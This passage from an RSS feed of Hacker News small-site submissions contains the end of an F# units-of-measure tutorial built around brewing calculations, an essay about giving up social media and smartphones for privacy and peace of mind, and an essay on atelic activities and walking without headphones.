</td>
<td><pre><span>///Gravity Point - A Simplified brewing unit for amount of sugar dissolved in solution</span>
[&lt;<span onmouseout="hideTip(event, 'fs9', 22)" onmouseover="showTip(event, 'fs9', 22)">Measure</span>&gt;] <span>type</span> <span onmouseout="hideTip(event, 'fs16', 23)" onmouseover="showTip(event, 'fs16', 23)">gp</span>
</pre>
</td>
</tr>
</tbody></table>

<p>Next up, we define the <em>association</em> between gravity points and US gallons.</p>

<table><tbody><tr><td><pre><span>1: </span>
</pre>
</td>
<td><pre>[&lt;<span onmouseout="hideTip(event, 'fs9', 24)" onmouseover="showTip(event, 'fs9', 24)">Measure</span>&gt;] <span>type</span> <span onmouseout="hideTip(event, 'fs17', 25)" onmouseover="showTip(event, 'fs17', 25)">ppg</span> <span>=</span> <span onmouseout="hideTip(event, 'fs16', 26)" onmouseover="showTip(event, 'fs16', 26)">gp</span> <span>/</span> <span onmouseout="hideTip(event, 'fs14', 27)" onmouseover="showTip(event, 'fs14', 27)">usGal</span>
</pre>
</td>
</tr>
</tbody></table>

<p>Our <code>ppg</code> measure can now be used in our calculations, which we'll get to in a minute.<br>
But first, a few quick points on this type of measure.</p>

<ul>
<li>The formulas that represent the measures can be written in various equivalent ways. This sometimes manifests in the results of expressions being inferred differently than we would expect - more on this later.</li>
<li>Equivalent formulas are compiled into a common representation and can therefore be substituted freely.</li>
<li>You cannot use numeric values in these formulae. However, we can declare conversion constants which we will also explore later.</li>
<li>You can use <code>1</code> in these formulae. <code>1</code> represents a <em>dimensionless</em> value. I will touch on dimensionless values when discussing error prevention in the next section.</li>
</ul>

<p>These points and others are explained in detail on the <a href="https://msdn.microsoft.com/en-us/library/dd233243.aspx">MSDN</a> page for Units of Measure.</p>

<h2>Using Units of Measure for error prevention</h2>

<p>Units of measure come in extremely handy for preventing us introducing errors into our code by using a value with an incorrect unit in a calculation or function.<br>
As an example taken from the world of brewing, we wouldn't want to mix up the units when making calculations about how much grain we need.</p>

<p>Below is an example of a function that can only take values with the specified dimensions.</p>

<table><tbody><tr><td><pre><span>1: </span>
<span>2: </span>
<span>3: </span>
</pre>
</td>
<td><pre><span>///Converts a points per gal (gp / usGal) and volume into total gravity points in that volume</span>
<span>let</span> <span onmouseout="hideTip(event, 'fs18', 28)" onmouseover="showTip(event, 'fs18', 28)">TotalGravityPoints</span> (<span onmouseout="hideTip(event, 'fs19', 29)" onmouseover="showTip(event, 'fs19', 29)">potential</span><span>:</span><span onmouseout="hideTip(event, 'fs20', 30)" onmouseover="showTip(event, 'fs20', 30)">float</span><span>&lt;</span><span onmouseout="hideTip(event, 'fs16', 31)" onmouseover="showTip(event, 'fs16', 31)">gp</span> <span>/</span> <span onmouseout="hideTip(event, 'fs14', 32)" onmouseover="showTip(event, 'fs14', 32)">usGal</span><span>&gt;</span>) (<span onmouseout="hideTip(event, 'fs21', 33)" onmouseover="showTip(event, 'fs21', 33)">vol</span> <span>:</span> <span onmouseout="hideTip(event, 'fs20', 34)" onmouseover="showTip(event, 'fs20', 34)">float</span><span>&lt;</span><span onmouseout="hideTip(event, 'fs14', 35)" onmouseover="showTip(event, 'fs14', 35)">usGal</span><span>&gt;</span>) <span>=</span>  
    <span onmouseout="hideTip(event, 'fs19', 36)" onmouseover="showTip(event, 'fs19', 36)">potential</span> <span>*</span> <span onmouseout="hideTip(event, 'fs21', 37)" onmouseover="showTip(event, 'fs21', 37)">vol</span>
</pre>
</td>
</tr>
</tbody></table>

<p>As you can see, this function is declared with explicit type annotations specifying the dimensions of the parameters.<br>
The F# compiler will now prevent you from using this function with either dimensionless floats, or floats with the the wrong dimension (and of course, non float values).</p>

<p>Consider the following example where we attempt to call the function with dimensionless values:</p>

<table><tbody><tr><td><pre><span>1: </span>
</pre>
</td>
<td><pre><span>let</span> <span onmouseout="hideTip(event, 'fs22', 38)" onmouseover="showTip(event, 'fs22', 38)">totalGravPoints</span> <span>=</span> <span onmouseout="hideTip(event, 'fs18', 39)" onmouseover="showTip(event, 'fs18', 39)">TotalGravityPoints</span> <span>240.0</span> <span>5.0</span>
</pre>
</td>
</tr>
</tbody></table>

<p>Attempting to compile this line of code produces the following error notifying us that we haven't satisfied the type constraints and preventing us from introducing an error into our code.</p>

<div><pre lang="output">error FS0001: This expression was expected to have type
float&lt;gp/usGal&gt;    
    but here has type
float 
</pre></div>

<p>Likewise the compiler will stop us from passing different <code>UoM</code> to the function. 
Suppose we attempted to use a volume in Litres instead of the expected US Gallons.</p>

<p>We receive a similar error.</p>

<table><tbody><tr><td><pre><span>1: </span>
</pre>
</td>
<td><pre><span>let</span> <span onmouseout="hideTip(event, 'fs22', 40)" onmouseover="showTip(event, 'fs22', 40)">totalGravPoints</span> <span>=</span> <span onmouseout="hideTip(event, 'fs18', 41)" onmouseover="showTip(event, 'fs18', 41)">TotalGravityPoints</span> <span>240.0</span><span>&lt;</span><span onmouseout="hideTip(event, 'fs16', 42)" onmouseover="showTip(event, 'fs16', 42)">gp</span> <span>/</span> <span onmouseout="hideTip(event, 'fs14', 43)" onmouseover="showTip(event, 'fs14', 43)">usGal</span><span>&gt;</span> <span>5.0</span><span>&lt;</span><span onmouseout="hideTip(event, 'fs13', 44)" onmouseover="showTip(event, 'fs13', 44)">L</span><span>&gt;</span>
</pre>
</td>
</tr>
</tbody></table>

<div><pre lang="output">error FS0001: Type mismatch. Expecting a
    float&lt;usGal&gt;    
but given a
    float&lt;L&gt;    
The unit of measure 'usGal' does not match the unit of measure 'L'
</pre></div>

<p>This example may be quite contrived, but it highlights the type safety provided by units of measure.
The F# compiler will also prevent us introducing arithmetic errors such as attempting to add/subtract a different or dimensionless unit from another.<br>
For instance, the following would not compile, returning the errors shown.</p>

<table><tbody><tr><td><pre><span>1: </span>
</pre>
</td>
<td><pre><span>let</span> <span onmouseout="hideTip(event, 'fs15', 45)" onmouseover="showTip(event, 'fs15', 45)">volume</span> <span>=</span> <span>5.0</span><span>&lt;</span><span onmouseout="hideTip(event, 'fs14', 46)" onmouseover="showTip(event, 'fs14', 46)">usGal</span><span>&gt;</span> <span>+</span> <span>5.0</span><span>&lt;</span><span onmouseout="hideTip(event, 'fs13', 47)" onmouseover="showTip(event, 'fs13', 47)">L</span><span>&gt;</span>
</pre>
</td>
</tr>
</tbody></table>

<div><pre lang="output">//result
error FS0001: The unit of measure 'L' does not match the unit of measure 'usGal'
</pre></div>

<p>Likewise attempting to use a dimensionless value would also fail.</p>

<table><tbody><tr><td><pre><span>1: </span>
</pre>
</td>
<td><pre><span>let</span> <span onmouseout="hideTip(event, 'fs15', 48)" onmouseover="showTip(event, 'fs15', 48)">volume</span> <span>=</span> <span>5.0</span><span>&lt;</span><span onmouseout="hideTip(event, 'fs14', 49)" onmouseover="showTip(event, 'fs14', 49)">usGal</span><span>&gt;</span> <span>+</span> <span>5.0</span>
</pre>
</td>
</tr>
</tbody></table>

<div><pre lang="output">//result
error FS0001: The type 'float' does not match the type 'float&lt;usGal&gt;'
</pre></div>

<p>A dimensionless value can either be declared simply with no measure, as above, or with the explicit measure of <code>1</code> like so:</p>

<table><tbody><tr><td><pre><span>1: </span>
</pre>
</td>
<td><pre><span>let</span> <span onmouseout="hideTip(event, 'fs15', 50)" onmouseover="showTip(event, 'fs15', 50)">volume</span> <span>=</span> <span>5.0</span><span>&lt;</span><span onmouseout="hideTip(event, 'fs14', 51)" onmouseover="showTip(event, 'fs14', 51)">usGal</span><span>&gt;</span> <span>+</span> <span>5.0</span><span>&lt;</span><span>1</span><span>&gt;</span>
</pre>
</td>
</tr>
</tbody></table>

<div><pre lang="output">//result
error FS0001: The type 'float' does not match the type 'float&lt;usGal&gt;'
</pre></div>

<p>Although we cannot add/subtract different or dimensionless values from an already dimensioned value, we can multiply or divide them.<br>
Multiplying or dividing by a dimensionless value will result in same measure, however using a different measure in the calculation will result in a different (potentially new) measure.</p>

<p>This brings us nicely to our next section.</p>

<h2>Effects of multiplication and division</h2>

<p>By multiplying or dividing a value that either has a measure already, or is dimensionless, we can create new units of measure.<br>
The result of this process is effectively to <em>combine</em> two different units of measure (remember, a dimensionless value can be thought of as having a measure of 1).</p>

<p>We have already declared a unit of measure that can be used to demonstrate this, our <code>ppg</code> measure.<br>
A <code>ppg</code> value is simply a <code>gp</code> value divided by a <code>usGal</code> value.</p>

<table><tbody><tr><td><pre><span>1: </span>
<span>2: </span>
<span>3: </span>
</pre>
</td>
<td><pre><span>let</span> <span onmouseout="hideTip(event, 'fs23', 52)" onmouseover="showTip(event, 'fs23', 52)">totalGravityPoints</span> <span>=</span> <span>240.0</span><span>&lt;</span><span onmouseout="hideTip(event, 'fs16', 53)" onmouseover="showTip(event, 'fs16', 53)">gp</span><span>&gt;</span>
<span>let</span> <span onmouseout="hideTip(event, 'fs24', 54)" onmouseover="showTip(event, 'fs24', 54)">beerVolume</span> <span>=</span> <span>5.0</span><span>&lt;</span><span onmouseout="hideTip(event, 'fs14', 55)" onmouseover="showTip(event, 'fs14', 55)">usGal</span><span>&gt;</span>
<span>let</span> <span onmouseout="hideTip(event, 'fs25', 56)" onmouseover="showTip(event, 'fs25', 56)">pointsPerGallon</span> <span>=</span> <span onmouseout="hideTip(event, 'fs23', 57)" onmouseover="showTip(event, 'fs23', 57)">totalGravityPoints</span> <span>/</span> <span onmouseout="hideTip(event, 'fs24', 58)" onmouseover="showTip(event, 'fs24', 58)">beerVolume</span>
</pre>
</td>
</tr>
</tbody></table>

<p>The value of pointsPerGallon above is just what we would expect.</p>

<div><pre lang="output">val pointsPerGallon : float&lt;gp/usGal&gt; = 48.0
</pre></div>

<p>The exact same principle works for multiplication too and don't forget, two or more units of measure can be considered equal.</p>

<h2>Type inference and measure equality</h2>

<p>Lets take the following function as an example;</p>

<table><tbody><tr><td><pre><span>1: </span>
<span>2: </span>
<span>3: </span>
</pre>
</td>
<td><pre><span>///Calculates the maximum potential gravity points for a given weight of grain with the given potential and target volume</span>
<span>let</span> <span onmouseout="hideTip(event, 'fs26', 59)" onmouseover="showTip(event, 'fs26', 59)">MaxPotentialPoints</span> (<span onmouseout="hideTip(event, 'fs27', 60)" onmouseover="showTip(event, 'fs27', 60)">grainPotential</span><span>:</span><span onmouseout="hideTip(event, 'fs20', 61)" onmouseover="showTip(event, 'fs20', 61)">float</span><span>&lt;</span><span onmouseout="hideTip(event, 'fs16', 62)" onmouseover="showTip(event, 'fs16', 62)">gp</span><span>/</span><span onmouseout="hideTip(event, 'fs11', 63)" onmouseover="showTip(event, 'fs11', 63)">lb</span><span>&gt;</span>) (<span onmouseout="hideTip(event, 'fs28', 64)" onmouseover="showTip(event, 'fs28', 64)">grain</span><span>:</span><span onmouseout="hideTip(event, 'fs20', 65)" onmouseover="showTip(event, 'fs20', 65)">float</span><span>&lt;</span><span onmouseout="hideTip(event, 'fs11', 66)" onmouseover="showTip(event, 'fs11', 66)">lb</span><span>&gt;</span>) (<span onmouseout="hideTip(event, 'fs21', 67)" onmouseover="showTip(event, 'fs21', 67)">vol</span><span>:</span><span onmouseout="hideTip(event, 'fs20', 68)" onmouseover="showTip(event, 'fs20', 68)">float</span><span>&lt;</span><span onmouseout="hideTip(event, 'fs14', 69)" onmouseover="showTip(event, 'fs14', 69)">usGal</span><span>&gt;</span>) <span>=</span> 
    (<span onmouseout="hideTip(event, 'fs27', 70)" onmouseover="showTip(event, 'fs27', 70)">grainPotential</span> <span>*</span> <span onmouseout="hideTip(event, 'fs28', 71)" onmouseover="showTip(event, 'fs28', 71)">grain</span>) <span>/</span> <span onmouseout="hideTip(event, 'fs21', 72)" onmouseover="showTip(event, 'fs21', 72)">vol</span>
</pre>
</td>
</tr>
</tbody></table>

<p>The F# compiler correctly infers that the result of this function is of the type <code>float&lt;gp/usGal&gt;</code> (hover over the function above to see this)</p>

<p>We also know that equivalent measures are interchangeable.<br>
This means, we could alternatively declare this function as returning a <code>&lt;ppg&gt;</code> measure explicitly like so.</p>

<table><tbody><tr><td><pre><span>1: </span>
<span>2: </span>
<span>3: </span>
</pre>
</td>
<td><pre><span>//Explicit return type</span>
<span>let</span> <span onmouseout="hideTip(event, 'fs29', 73)" onmouseover="showTip(event, 'fs29', 73)">MaxPotentialPoints</span> (<span onmouseout="hideTip(event, 'fs27', 74)" onmouseover="showTip(event, 'fs27', 74)">grainPotential</span><span>:</span><span onmouseout="hideTip(event, 'fs20', 75)" onmouseover="showTip(event, 'fs20', 75)">float</span><span>&lt;</span><span onmouseout="hideTip(event, 'fs16', 76)" onmouseover="showTip(event, 'fs16', 76)">gp</span><span>/</span><span onmouseout="hideTip(event, 'fs11', 77)" onmouseover="showTip(event, 'fs11', 77)">lb</span><span>&gt;</span>) (<span onmouseout="hideTip(event, 'fs28', 78)" onmouseover="showTip(event, 'fs28', 78)">grain</span><span>:</span><span onmouseout="hideTip(event, 'fs20', 79)" onmouseover="showTip(event, 'fs20', 79)">float</span><span>&lt;</span><span onmouseout="hideTip(event, 'fs11', 80)" onmouseover="showTip(event, 'fs11', 80)">lb</span><span>&gt;</span>) (<span onmouseout="hideTip(event, 'fs21', 81)" onmouseover="showTip(event, 'fs21', 81)">vol</span><span>:</span><span onmouseout="hideTip(event, 'fs20', 82)" onmouseover="showTip(event, 'fs20', 82)">float</span><span>&lt;</span><span onmouseout="hideTip(event, 'fs14', 83)" onmouseover="showTip(event, 'fs14', 83)">usGal</span><span>&gt;</span>) <span>:</span><span onmouseout="hideTip(event, 'fs20', 84)" onmouseover="showTip(event, 'fs20', 84)">float</span><span>&lt;</span><span onmouseout="hideTip(event, 'fs17', 85)" onmouseover="showTip(event, 'fs17', 85)">ppg</span><span>&gt;</span> <span>=</span> 
    (<span onmouseout="hideTip(event, 'fs27', 86)" onmouseover="showTip(event, 'fs27', 86)">grainPotential</span> <span>*</span> <span onmouseout="hideTip(event, 'fs28', 87)" onmouseover="showTip(event, 'fs28', 87)">grain</span>) <span>/</span> <span onmouseout="hideTip(event, 'fs21', 88)" onmouseover="showTip(event, 'fs21', 88)">vol</span>
</pre>
</td>
</tr>
</tbody></table>

<p>The F# type system will allow us to use either of these functions where the alternative dimension is required (i.e. a <code>ppg</code> where a <code>gp/usGal</code> is expected).
I did find however, that in certain situations, it can make code much clearer to be explicit about the return type.</p>

<p>Consider the following example where we use a <code>pgp</code> measure instead of the <code>gp/lb</code> for the grainPotential:</p>

<table><tbody><tr><td><pre><span>1: </span>
<span>2: </span>
<span>3: </span>
<span>4: </span>
<span>5: </span>
</pre>
</td>
<td><pre><span>///Potential Gravity Points - The number of Gravity points in a lb of a particular malt</span>
[&lt;<span onmouseout="hideTip(event, 'fs9', 89)" onmouseover="showTip(event, 'fs9', 89)">Measure</span>&gt;] <span>type</span> <span onmouseout="hideTip(event, 'fs30', 90)" onmouseover="showTip(event, 'fs30', 90)">pgp</span> <span>=</span> <span onmouseout="hideTip(event, 'fs16', 91)" onmouseover="showTip(event, 'fs16', 91)">gp</span> <span>/</span> <span onmouseout="hideTip(event, 'fs11', 92)" onmouseover="showTip(event, 'fs11', 92)">lb</span>

<span>let</span> <span onmouseout="hideTip(event, 'fs31', 93)" onmouseover="showTip(event, 'fs31', 93)">MaxPotentialPoints</span> (<span onmouseout="hideTip(event, 'fs32', 94)" onmouseover="showTip(event, 'fs32', 94)">grainPotential</span><span>:</span><span onmouseout="hideTip(event, 'fs20', 95)" onmouseover="showTip(event, 'fs20', 95)">float</span><span>&lt;</span><span onmouseout="hideTip(event, 'fs30', 96)" onmouseover="showTip(event, 'fs30', 96)">pgp</span><span>&gt;</span>) (<span onmouseout="hideTip(event, 'fs28', 97)" onmouseover="showTip(event, 'fs28', 97)">grain</span><span>:</span><span onmouseout="hideTip(event, 'fs20', 98)" onmouseover="showTip(event, 'fs20', 98)">float</span><span>&lt;</span><span onmouseout="hideTip(event, 'fs11', 99)" onmouseover="showTip(event, 'fs11', 99)">lb</span><span>&gt;</span>) (<span onmouseout="hideTip(event, 'fs21', 100)" onmouseover="showTip(event, 'fs21', 100)">vol</span><span>:</span><span onmouseout="hideTip(event, 'fs20', 101)" onmouseover="showTip(event, 'fs20', 101)">float</span><span>&lt;</span><span onmouseout="hideTip(event, 'fs14', 102)" onmouseover="showTip(event, 'fs14', 102)">usGal</span><span>&gt;</span>) <span>=</span> 
    (<span onmouseout="hideTip(event, 'fs32', 103)" onmouseover="showTip(event, 'fs32', 103)">grainPotential</span> <span>*</span> <span onmouseout="hideTip(event, 'fs28', 104)" onmouseover="showTip(event, 'fs28', 104)">grain</span>) <span>/</span> <span onmouseout="hideTip(event, 'fs21', 105)" onmouseover="showTip(event, 'fs21', 105)">vol</span>
</pre>
</td>
</tr>
</tbody></table>

<p>If you look at the inferred return type of this function you will see it is <code>float&lt;lb pgp/usGal&gt;</code>.<br>
While this is perfectly correct, it can be confusing.</p>

<p>We can clearly see that the <code>pgp</code> measure is equivalent to that of <code>gp…</code></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://stevenpemberton.net/blog/2015/03/11/FSharp-Units-Of-Measure/">http://stevenpemberton.net/blog/2015/03/11/FSharp-Units-Of-Measure/</a></em></p>]]>
            </description>
            <link>http://stevenpemberton.net/blog/2015/03/11/FSharp-Units-Of-Measure/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26226932</guid>
            <pubDate>Mon, 22 Feb 2021 17:06:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Living Like It's 99: No Social Media, No Smartphone]]>
            </title>
            <description>
<![CDATA[
Score 90 | Comments 143 (<a href="https://news.ycombinator.com/item?id=26226864">thread link</a>) | @betaman0
<br/>
February 22, 2021 | https://www.alvarez.io/posts/living-like-it-s-99/ | <a href="https://web.archive.org/web/*/https://www.alvarez.io/posts/living-like-it-s-99/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
				<p><img src="https://www.alvarez.io/img/color/l99.jpg" alt="Robot"></p>
<p>At the time of writing this article, I’ve been living without social media for 3 years and without a smartphone for 2 years. Everything started as an experiment motivated by my privacy concerns. I ended up living like that for an entire different reason: peace of mind. You can find a lot of people on internet that have tried this experiment, from a couple of days to an <a href="https://www.youtube.com/watch?v=B0RVWU_nROk">entire month</a>. However I discovered that the brain dependencies created by social media and smartphones take a lot longer to go away (30 days for me). You can’t really see the effects it has on your life unless you try this kind of experiment for a long time, because you will be stuck in the withdrawal phase that makes you crave dopamine.</p>
<p>Contrary to popular belief, I do not live in a cave where I spend my time coding without any social life, sorry guys ;) I did this experiment while having a busy professional and personal life: I traveled around the world, moved to a new city without knowing anyone, ran <a href="https://www.duple.io/">my own software startup</a>, met new people and made new friends, etc… So it is possible to live your life the same way, or even better, without a smartphone or social media.</p>
<p>I will share with you my experience leaving social media and my smartphone, the tools I replaced them with, some tips and tricks, people’s reactions to my experiment, as well as some funny anecdotes.</p>
<h2 id="lets-start-with-why">Let’s Start With Why</h2>
<h3 id="privacy">Privacy</h3>
<p>The original motivation behind this experiment was privacy. I’m a professional hacker, the things I can do are scary and I’m far from being the only one with these skills. <strong>Smartphones are a dream come true for people like me, little spy devices that are 24/7 on you, remotely accessible from anywhere around the world</strong>. Throw social media into the equation, and you can get inside the head of anybody, and make them do whatever you want. Yes, you should be scared. And that’s even without mentioning all the other <a href="https://lithub.com/what-does-privacy-really-mean-under-surveillance-capitalism/">privacy</a> and <a href="https://the.ink/p/we-can-have-democracy-or-we-can-have">freedom</a> issues that come with <a href="https://techcrunch.com/2019/09/04/facebook-phone-numbers-exposed/">social media</a> and <a href="https://nrkbeta.no/2020/12/03/my-phone-was-spying-on-me-so-i-tracked-down-the-surveillants/">smartphones</a>.</p>
<h3 id="curiosity">Curiosity</h3>
<p>Another reason, which is less dark, was curiosity. I like to experiment and try new things in my life. I was curious about the idea of living without a smartphone and social media especially in a world more connected than ever. And if I didn’t like the experiment, I could always go back to <a href="https://www.meta-nomad.net/avoiding-the-global-lobotomy/">zombieland</a>.</p>
<h3 id="planned-obsolescence">Planned Obsolescence</h3>
<p>The cherry on top was to stop paying each year for a new smartphone, that does nothing more than the previous one, just because the providers decided to <a href="https://en.wikipedia.org/wiki/Planned_obsolescence">sabotage old models</a> so they <a href="https://en.wikipedia.org/wiki/Batterygate">stop working</a>.</p>
<h3 id="peace-of-mind">Peace of mind</h3>
<p>This is for me the most important reason (even though I discovered it afterwards). The positive effects on your mind, being free from social media and smartphones, are incredible. More on it later.</p>

<blockquote>
<p>“Technology has solved old economics problems by giving us new psychological problems.”<br>
Mark Manson, The Subtle Art of Not Giving a F*ck</p>
</blockquote>
<p>In 2018 I deleted my accounts from Twitter, Facebook, Instagram and WhatsApp. No coming back, no temptation to reactivate them later on. I kept LinkedIn on standby for professional use although it came close to being deleted as well. WhatsApp got replaced by <a href="https://signal.org/">Signal</a> because Facebook bought them, plus <a href="https://www.forbes.com/sites/parmyolson/2018/09/26/exclusive-whatsapp-cofounder-brian-acton-gives-the-inside-story-on-deletefacebook-and-why-he-left-850-million-behind/">they’re not really big fan s of privacy</a>.</p>
<p>During that year I kept my smartphone, as I wanted to do the experiment gradually. This decision allowed me to discover something quite counter intuitive about social media and smartphones (more on it later).</p>
<p>From that point on I was reachable by SMS, call, email and Signal. I wasn’t ready for what happened next. Fasten your seatbelts.</p>
<h3 id="people-thought-i-was-dead">People Thought I Was Dead</h3>
<p>The first reaction people had was to think something bad had happened to me, some of them even thought I was dead. Then something socially curious happened: everybody started speaking to each other on Facebook and WhatsApp to try to figure out what was wrong. Some of them even contacted my family multiple times. They all had my phone number, email address and other ways of contacting me. <strong>However, none of them did</strong>. It was like I had exited the matrix, and was living in another reality.</p>
<h3 id="trustworthiness">Trustworthiness</h3>
<p>I was told that I couldn’t be trusted since people can’t check online what I’m doing when I’m not around.</p>
<p>Yeah, you read that right.</p>
<p><strong>Society has been brainwashed to believe that privacy is something criminal. Sorry to disappoint, but privacy is a basic fundament of freedom and democracy. That’s why the voting system is anonymous</strong> [1]. When people tell you “<a href="https://write.privacytools.io/freddy/why-privacy-matters-even-if-you-have-nothing-to-hide">If you have nothing to hide, you have nothing to fear</a>”, what they really mean is “democracy is overrated, get over it”.</p>
<p><em>[1] Privacy: you know who I am but not what I do. Anonymity: You know what I do but not who I am. The voting system uses both, privacy when you go vote, anonymity when they count the results.</em></p>
<h3 id="whatsapp">WhatsApp</h3>
<p>This was for me the biggest problem. <a href="https://seirdy.one/2021/01/27/whatsapp-and-the-domestication-of-users.html">Getting people out of WhatsApp</a> if they wanted to talk to me created a lot of friction. Some of them even stopped texting me because they had to open another app on their phone in order to write to me.</p>
<p>Yeah, you also read that right.</p>
<p>I don’t miss WhatsApp, nor do I miss its endless group talks without anything useful. If you leave one of these groups people look at you as if you did something wrong. In the end I still had access to all the event’s information I needed despite them being organized on WhatsApp. In regards to this, not having the app didn’t change my life much.</p>
<p>A trick I’ve developed, when giving my contact info to new people, is to enter my phone number on their smartphone myself, and install Signal for them. This removed a lot of friction. I would then explain my experiment to them and tell them I can only be contacted via this app. I’ve always had a positive reaction. Everybody’s been curious and asking a lot of questions.</p>
<h3 id="and-then-nothing-happened">And Then Nothing Happened</h3>
<p>During the first weeks without social media, I felt off. As if I was missing out on something big that was happening. Like everybody was having fun except me. Once the <a href="https://joshcsimmons.com/quit-social-media/">withdrawal phase</a> went away, I realized that my life hadn’t changed that much. I was still doing the same things, talking to the same people, going to the same parties, etc… It was just more quiet and peaceful.</p>
<p><strong>I was no longer bombarded with pictures of everybody trying to fake a life they’re not living for the sole purpose of impressing someone else: <a href="https://hbr.org/2017/04/a-new-more-rigorous-study-confirms-the-more-you-use-facebook-the-worse-you-feel">my life had just upgraded</a>.</strong></p>
<p>In the end, after everybody got over their initial shock and calmed down, it became normal for them to contact me using Signal, and life went on as usual.</p>
<h2 id="round-2-goodbye-smartphone">Round 2: Goodbye Smartphone</h2>
<p><img src="https://www.alvarez.io/img/color/l99-2.jpg" alt="Phone"></p>
<p>Unlike social media, smartphones are a lot harder to get rid off. They handle many more things than just simply communicating with people.  I work all day long with a computer, most of what the smartphone was doing could be handled by my laptop. For the rest, I narrowed down my bare essential to Music, Pictures, GPS navigation and of course GSM calls.</p>
<h3 id="the-hardware">The Hardware</h3>
<p>You could solve these problems quite easily using multiple devices, however I wanted to be smart about it and not walk around with a luggage just to carry around all this stuff. After doing some research I figured out the perfect combination and I was even able to reduce the amount of things I had in my pockets.</p>

			</div></div>]]>
            </description>
            <link>https://www.alvarez.io/posts/living-like-it-s-99/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26226864</guid>
            <pubDate>Mon, 22 Feb 2021 17:02:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[It's ok to take a walk without headphones]]>
            </title>
            <description>
<![CDATA[
Score 35 | Comments 58 (<a href="https://news.ycombinator.com/item?id=26226862">thread link</a>) | @khehy
<br/>
February 22, 2021 | https://radreads.co/telic/ | <a href="https://web.archive.org/web/*/https://radreads.co/telic/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><h2 itemprop="name"><span itemprop="dateCreated">20 Feb<meta itemprop="interactionCount" content="UserComments: 0"></span> It’s ok to take a walk without headphones</h2><p>The Big Sur MacOS update delivers a delightful <em>Easter Egg</em>.</p><p>Your AirPods now magically follow you across devices. Gone are the awkward transitions (“hold on, let me connect my AirPods”) while fiddling with your Bluetooth settings and pressing that random button on the white case.</p><p>Now you can gracefully glide from podcast, to Zoom call, to Discover Weekly, to Clubhouse, to audiobooks while enlisting Siri’s help. <strong>Seamlessly and without interruption.</strong></p><p>Yet it turns out that our headphones have been following us for much longer than a MacOS update.</p><div><figure><img src="https://i.insider.com/5273e2a669bedd7c06afe99f?width=1100&amp;format=jpeg&amp;auto=webp" alt="Image result for original ipod add" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure></div><p>Remember that original promise <strong>“1,000 songs in your Pocket?”</strong> <em>That was 20 years ago.</em></p><p><strong>“All of humanity’s problems stem from man’s inability to sit quietly in a room alone,”</strong> wrote the 17th century philosopher Blaise Pascal. Yet thanks to these white little earbuds, we never need to spend that quiet time alone.</p><hr><p>Do all of life’s moments need to be productive moments?</p><p>To answer that question, let’s distinguish between two types of activities: <strong>telic </strong>and<strong> atelic.</strong></p><p>Stemming from the Greek term <em>Telos </em>(“Having an inherent purpose”), <strong>telic activities</strong> are directed towards an end goal. Conversely, <strong>atelic</strong> activities are pursued for their own sake.</p><p>Telic activities include writing a novel, learning a new skill and building a house all have <strong>specific outcomes. </strong></p><p>On the other hand atelic activities – going for a walk, a long talk with friends, making love, and listening to your favorite songs – <strong>have no end goal.</strong> You derive joy from the activity itself.</p><p>Here’s the rub. <strong>Atelic activities are not “productive.”</strong></p><p>You do not move yourself closer to your goals when you do a puzzle with your toddler. Or when you pause to observe the beauty of a sunset. <strong>These aren’t productive activities.</strong></p><p>And since my Type-A self finds these activities very uncomfortable, my brain does a little mental <strong><em>jiu jitsu</em></strong> to make them more comfortable. I call them <em>Telic Transformations.</em></p><p>As I watch Soul with the fam, I’m <a href="https://twitter.com/khemaridh/status/1342864974771732480">processing ideas</a> for upcoming blog posts. (And when I watch Toy Story, looking to identify the <em>Hero’s Journey </em>narrative arc.)</p><p>When I surf, I’m constantly thinking of the next maneuver to learn (<em>cutbacks</em>), or the next board I could buy.</p><p>Heck, even when sitting on the John (without an iPhone), I’ll grab one of the cleaning products and look for examples of good copy, logo design, or color pairings.</p><p>As Pascal says, those quiet moments with myself can be <strong>quite uncomfortable.</strong></p><p>And then there’s the ultimate telic transformation: <strong>the podcast.</strong></p><p>Thanks to this venerable audio format, the last bastion of atelic activities (a beach walk, cooking a family dinner, getting your kids to sleep) can become <strong>instantly productive</strong> with the most recent episode of <em>The Tim Ferriss show.</em></p><p>Now this isn’t a critique against learning. Nor one against continuous self-improvement. Or about pursuing one’s insatiable curiosity.</p><p>But isn’t this pull to turn <strong>everything</strong> <strong>into an</strong> <strong>outcome</strong> quite peculiar?</p><p>And here comes a conundrum. Telic activities end. Yet the desire lives on. So we <a href="https://radreads.co/when-then-trap/">move the goal line</a>. Another goal. Another outcome.</p><p>And one starts laying the bricks for the hedonic treadmill.</p><p>In <a href="https://www.newyorker.com/books/page-turner/the-philosophy-of-the-midlife-crisis">The Philosophy of the Midlife Crisis</a>, the philosopher Kieran Setiya writes that “there’s something intrinsically self-defeating about getting things done.” Once you do the thing, it can’t be done again. Setiya continues:</p><blockquote><p><em>“Having a child, writing a book, saving a life—the completion of your project may be of value, but it means that the project can no longer be your guide. In pursuing a goal, you are trying to exhaust your interaction with something good, as if you were to make friends for the sake of saying goodbye.”</em></p></blockquote><p>Setiya concludes that “being consumed by plans” can be problematic:</p><blockquote><p><em>“They are schemes for which success can only mean cessation.”</em></p></blockquote><p>We’re not human doings. We’re human beings. Personally, I suspect that my <em>telic transformations</em> come from a place of fear. The fear of not <em>doing enough</em>, comes from the fear of <em>not being enough</em>. Confusing <a href="https://radreads.co/identity-achievement/">identity and achievement</a> becomes a slippery slope that robs me from the present and the beauty and love that surround me.</p><p>So I’ll heed Pascal’s advice – and ditch the AirPods during my next beach walk.</p> </div></div></div>]]>
            </description>
            <link>https://radreads.co/telic/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26226862</guid>
            <pubDate>Mon, 22 Feb 2021 17:02:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How Ahrefs designed content to grow millions in revenue]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26226832">thread link</a>) | @hello123benj
<br/>
